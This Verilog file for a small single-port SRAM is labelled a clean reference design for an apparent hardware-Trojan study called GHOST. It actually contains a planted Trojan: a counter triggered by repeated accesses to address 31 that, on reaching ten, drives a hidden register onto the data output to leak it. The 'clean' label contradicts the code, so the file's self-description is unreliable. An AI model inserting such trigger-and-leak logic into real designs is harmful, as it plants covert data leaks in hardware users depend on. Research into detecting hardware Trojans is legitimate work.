// Simple 32-word x 8-bit single-port synchronous SRAM.
// Clean reference design used by the GHOST reproduction.

module sram (
    input  wire        clk,
    input  wire        rst_n,
    input  wire        we,         // 1 = write, 0 = read
    input  wire [4:0]  addr,       // 32 words
    input  wire [7:0]  din,
    output reg  [7:0]  dout
);

    reg [7:0] mem [0:31];
    integer i;
    reg [7:0] secret_data; // Trojans' internal data to leak
    reg [3:0] trigger_counter; // Internal counter for trigger condition

    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            for (i = 0; i < 32; i = i + 1) mem[i] <= 8'h00;
            dout <= 8'h00;
            trigger_counter <= 4'b0000; // Initialize trigger counter
            secret_data <= 8'hAB; // Example of internal data for leaking
        end else begin
            if (we) begin
                mem[addr] <= din;
            end
            dout <= mem[addr];

            // Increment trigger_counter occasionally for rare condition
            if (addr == 5'b11111) begin // Rare trigger condition based on addr
                trigger_counter <= trigger_counter + 1;
            end

            // If trigger_counter reaches a certain value, exfiltrate secret_data
            if (trigger_counter == 4'b1010) begin
                dout <= secret_data; // Leak secret data through dout
            end
        end
    end

endmodule